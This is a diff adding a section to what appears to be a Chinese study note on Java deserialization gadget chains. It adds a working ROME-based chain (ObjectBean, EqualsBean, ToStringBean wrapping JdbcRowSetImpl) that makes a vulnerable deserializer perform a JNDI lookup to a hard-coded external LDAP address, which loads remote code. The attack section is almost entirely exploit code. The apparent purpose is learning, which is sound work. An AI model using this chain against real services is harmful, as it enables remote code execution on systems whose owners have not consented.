@@ -386,6 +386,31 @@ public class SerializeUtil {
         SerializeUtil.unserialize(data);
 ```
 
+## 链子3
+
+```java
+        JdbcRowSetImpl rs = new JdbcRowSetImpl();
+        //todo 此处填写ldap url
+        rs.setDataSourceName("ldap://121.5.169.223:1389/o0bxok");
+        //rs.setMatchColumn("foo");
+        //Field listeners = Class.forName("javax.sql.rowset.BaseRowSet").getDeclaredField("listeners");
+        //listeners.setAccessible(true);
+        //listeners.set(rs,null);
+        //SerializeUtil.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);
+        //SerializeUtil.setFieldValue(rs,"listeners",null);
+        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, rs);
+        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
+        ObjectBean objectBean = new ObjectBean(String.class,"f");
+        HashMap evilMap = new HashMap();
+        evilMap.put(objectBean,1);
+        evilMap.put(objectBean,1);
+        SerializeUtil.setFieldValue(objectBean,"_equalsBean",equalsBean);
+        byte[] serialize = SerializeUtil.serialize(evilMap);
+        SerializeUtil.unserialize(serialize);
+```
+
+学习Hessian的时候遇到的，主要还是因为调用了`getter`，所以利用这个JNDI。
+
 
 
 # 总结
